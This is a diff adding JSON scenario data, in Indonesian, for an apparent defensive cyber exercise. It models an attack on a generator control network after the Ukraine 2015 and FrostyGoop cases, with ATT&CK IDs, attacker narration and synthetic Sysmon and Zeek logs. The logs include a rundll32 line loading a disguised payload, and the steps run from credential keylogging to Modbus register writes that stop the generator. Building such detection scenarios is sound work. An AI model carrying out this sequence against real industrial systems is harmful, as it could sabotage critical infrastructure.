+      "tech": "T1566.001",
+      "tactic": "Initial Access",
+      "from": "INET",
+      "host": "WS-01",
+      "src": [
+       "UA15"
+      ],
+      "name": "Lampiran Office bermakro dibuka di WS-01",
+      "note": "Ukraina 2015: pijakan awal lewat lampiran Microsoft Office di surel phishing (ATT&CK C0028, T1566.001, T1204.002)",
+      "needs": [
+       "reach:WS-01"
+      ],
+      "fx": {
+       "on": [
+        "WS-01"
+       ],
+       "creds": [],
+       "c2": null,
+       "ot": null
+      },
+      "think": "Lampiran dibuka dan makronya diizinkan. Saya punya pijakan di WS-01.",
+      "logs": [
+       {
+        "src": "Sysmon",
+        "id": 1,
+        "host": "WS-01",
+        "f": {
+         "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+         "Image": "C:\\Windows\\System32\\rundll32.exe",
+         "CommandLine": "rundll32.exe C:\\Users\\Public\\FONTCACHE.DAT,#1",
+         "User": "LATIH\\op.logistik"
+        }
+       }
+      ],
+      "prio": 1,
+      "gap": null
+     }
+    ],
+    "optional": false,
+    "c2": false
+   },
+   {
+    "key": "c2",
+    "goal": "membuka kanal kendali",
+    "t": 35,
+    "c2": true,
+    "options": [
+     {
+      "id": "c2-a",
+      "prio": 1,
+      "tech": "T1071.001",
+      "tactic": "Command and Control",
+      "from": "192.0.2.150",
+      "host": "WS-01",
+      "src": [
+       "UA15"
+      ],
+      "name": "Kanal kendali HTTP ke 192.0.2.150",
+      "note": "Ukraina 2015: BlackEnergy berkomunikasi dengan C2 lewat HTTP POST (ATT&CK C0028, T1071.001)",
+      "needs": [
+       "on:WS-01",
+       "ip:192.0.2.150"
+      ],
+      "fx": {
+       "on": [],
+       "creds": [],
+       "c2": "192.0.2.150",
+       "ot": null
+      },
+      "think": "Kanal kendali hidup. Lalu lintasnya terlihat seperti penjelajahan web biasa.",
+      "logs": [
+       {
+        "src": "Sysmon",
+        "id": 3,
+        "host": "WS-01",
+        "f": {
+         "Image": "C:\\Windows\\System32\\rundll32.exe",
+         "Initiated": "true",
+         "DestinationIp": "192.0.2.150",
+         "DestinationPort": 443,
+         "Protocol": "tcp"
+        }
+       }
+      ],
+      "gap": null
+     },
+     {
+      "id": "c2-b",
+      "prio": 2,
+      "tech": "T1071.001",
+      "tactic": "Command and Control",
+      "from": "203.0.113.9",
+      "host": "WS-01",
+      "src": [
+       "UA15"
+      ],
+      "name": "Kanal kendali cadangan ke 203.0.113.9",
+      "note": "ATT&CK C0028, T1071.001",
+      "needs": [
+       "on:WS-01",
+       "ip:203.0.113.9"
+      ],
+      "fx": {
+       "on": [],
+       "creds": [],
+       "c2": "203.0.113.9",
+       "ot": null
+      },
+      "think": "Kanal pertama diputus. Saya pindah ke server cadangan.",
+      "logs": [
+       {
+        "src": "Sysmon",
+        "id": 3,
+        "host": "WS-01",
+        "f": {
+         "Image": "C:\\Windows\\System32\\rundll32.exe",
+         "Initiated": "true",
+         "DestinationIp": "203.0.113.9",
+         "DestinationPort": 443,
+         "Protocol": "tcp"
+        }
+       }
+      ],
+      "gap": null
+     }
+    ],
+    "optional": false
+   },
+   {
+    "key": "kred",
+    "goal": "mencuri kredensial",
+    "t": 80,
+    "options": [
+     {
+      "id": "keylog",
+      "tech": "T1056.001",
+      "tactic": "Credential Access",
+      "from": "WS-01",
+      "host": "WS-01",
+      "src": [
+       "UA15"
+      ],
+      "name": "Keylogger merekam kredensial VPN operator",
+      "note": "Ukraina 2015: kredensial dikumpulkan lewat plugin keylogger BlackEnergy (ATT&CK C0028, T1056.001)",
+      "needs": [
+       "on:WS-01",
+       "c2"
+      ],
+      "fx": {
+       "on": [],
+       "creds": [
+        "op.genset"
+       ],
+       "c2": null,
+       "ot": null
+      },
+      "think": "Operator genset mengetik kata sandi VPN di WS-01. Saya merekamnya diam-diam di dalam svchost.",
+      "logs": [
+       {
+        "src": "Sysmon",
+        "id": 11,
+        "host": "WS-01",
+        "f": {
+         "Image": "C:\\Windows\\System32\\svchost.exe",
+         "TargetFilename": "C:\\Users\\op.logistik\\AppData\\Local\\Temp\\~DF3A1.tmp"
+        }
+       }
+      ],
+      "gap": "Keylogger bekerja di dalam proses yang disusupi (ATT&CK C0028 mencatat BlackEnergy dimuat ke svchost.exe, T1055). Tidak ada aturan deteksi di MUSUH yang cocok untuk jejak ini: celah deteksi yang disengaja.",
+      "prio": 1
+     }
+    ],
+    "optional": false,
+    "c2": false
+   },
+   {
+    "key": "vpn",
+    "goal": "masuk ke jaringan kendali genset",
+    "t": 125,
+    "options": [
+     {
+      "id": "vpn",
+      "prio": 1,
+      "tech": "T0822",
+      "tactic": "ICS Initial Access",
+      "from": "WS-01",
+      "host": "HMI-01",
+      "src": [
+       "UA15"
+      ],
+      "name": "Login VPN ke jaringan kendali dengan akun op.genset, lalu RDP ke HMI-01",
+      "note": "Ukraina 2015: akun sah dari Domain Controller dipakai untuk masuk ke VPN sistem kendali (ATT&CK C0028, T0822, T0859)",
+      "needs": [
+       "on:WS-01",
+       "c2",
+       "reach:VPN-01",
+       "reach:HMI-01",
+       "cred:op.genset"
+      ],
+      "fx": {
+       "on": [
+        "HMI-01"
+       ],
+       "creds": [],
+       "c2": null,
+       "ot": null
+      },
+      "think": "Dengan akun operator, saya masuk ke VPN jaringan kendali. Layar HMI genset ada di depan saya.",
+      "logs": [
+       {
+        "src": "Security",
+        "id": 4624,
+        "host": "HMI-01",
+        "f": {
+         "LogonType": 10,
+         "AuthenticationPackageName": "Negotiate",
+         "TargetUserName": "op.genset",
+         "IpAddress": "10.30.1.2"
+        }
+       },
+       {
+        "src": "Zeek",
+        "id": "conn",
+        "host": "HMI-01",
+        "f": {
+         "id.orig_h": "10.30.1.2",
+         "id.resp_h": "10.30.9.10",
+         "id.resp_p": 3389,
+         "service": "rdp"
+        }
+       }
+      ],
+      "gap": null
+     },
+     {
+      "id": "dualhome",
+      "prio": 2,
+      "tech": "T0886",
+      "tactic": "ICS Lateral Movement",
+      "from": "WS-01",
+      "host": "HMI-01",
+      "src": [
+       "UA15"
+      ],
+      "name": "Lewat koneksi langsung WS-01 ke HMI-01 (aturan firewall yang terlalu longgar)",
+      "note": "Ukraina 2015: sistem OT terlihat dari jaringan IT; layanan jarak jauh dipakai untuk masuk ke perangkat ICS (ATT&CK C0028, T1018, T0886)",
+      "needs": [
+       "on:WS-01",
+       "c2",
+       "reach:HMI-01",
+       "anycred"
+      ],
+      "fx": {
+       "on": [
+        "HMI-01"
+       ],
+       "creds": [],
+       "c2": null,
+       "ot": null
+      },
+      "think": "Gerbang VPN ditutup, tetapi HMI-01 masih bisa dijangkau langsung dari WS-01. Saya masuk dengan akun yang sama.",
+      "logs": [
+       {
+        "src": "Security",
+        "id": 4624,
+        "host": "HMI-01",
+        "f": {
+         "LogonType": 10,
+         "AuthenticationPackageName": "Negotiate",
+         "TargetUserName": "op.genset",
+         "IpAddress": "10.30.2.15"
+        }
+       },
+       {
+        "src": "Zeek",
+        "id": "conn",
+        "host": "HMI-01",
+        "f": {
+         "id.orig_h": "10.30.2.15",
+         "id.resp_h": "10.30.9.10",
+         "id.resp_p": 3389,
+         "service": "rdp"
+        }
+       }
+      ],
+      "gap": null
+     }
+    ],
+    "optional": false,
+    "c2": false
+   },
+   {
+    "key": "pantau",
+    "goal": "membaca keadaan genset",
+    "t": 175,
+    "options": [
+     {
+      "id": "mbread",
+      "tech": "T0801",
+      "tactic": "ICS Collection",
+      "from": "HMI-01",
+      "host": "PLC-GEN",
+      "src": [
+       "FGP"
+      ],
+      "name": "Membaca holding register pengendali genset lewat Modbus TCP 502",
+      "note": "FrostyGoop membaca holding register lewat Modbus (ATT&CK S1165, T0801, T0885)",
+      "needs": [
+       "on:HMI-01"
+      ],
+      "fx": {
+       "on": [],
+       "creds": [],
+       "c2": null,
+       "ot": null
+      },
+      "think": "Register pengendali terbaca. Saya tahu register mana yang mengatur genset.",
+      "logs": [
+       {
+        "src": "Zeek",
+        "id": "modbus",
+        "host": "PLC-GEN",
+        "f": {
+         "id.orig_h": "10.30.9.10",
+         "id.resp_h": "10.30.9.20",
+         "id.resp_p": 502,
+         "func": "READ_HOLDING_REGISTERS",
+         "unit": 1,
+         "pdu_type": "REQ"
+        }
+       }
+      ],
+      "prio": 1,
+      "gap": null
+     }
+    ],
+    "optional": false,
+    "c2": false
+   },
+   {
+    "key": "dampak",
+    "goal": "mematikan genset",
+    "t": 210,
+    "options": [
+     {
+      "id": "mbwrite",
+      "tech": "T0836",
+      "tactic": "ICS Impair Process Control",
+      "from": "HMI-01",
+      "host": "PLC-GEN",
+      "src": [
+       "FGP",
+       "UA15"
+      ],
+      "name": "Menulis register Modbus: perintah henti genset",
+      "note": "FrostyGoop mengubah parameter lewat perintah Modbus sah, menyebabkan layanan pemanas berhenti (ATT&CK C0041, T0836, T0826). Ukraina 2015: perintah tidak sah ke perangkat (T1692.001)",
+      "needs": [
+       "on:HMI-01",
+       "modbus"
+      ],
+      "fx": {
+       "on": [],
+       "creds": [],
+       "c2": null,
+       "ot": "stop"
+      },
+      "think": "Register ditulis. Genset markas berhenti.",
+      "logs": [
+       {
+        "src": "Zeek",
+        "id": "modbus",
+        "host": "PLC-GEN",
+        "f": {
+         "id.orig_h": "10.30.9.10",
+         "id.resp_h": "10.30.9.20",
+         "id.resp_p": 502,
+         "func": "WRITE_SINGLE_REGISTER",
+         "unit": 1,
+         "pdu_type": "REQ"
+        }
+       }
+      ],
+      "prio": 1,
+      "gap": null
+     }
+    ],
+    "optional": false,
+    "c2": false
+   }
+  ]
+ }
+]
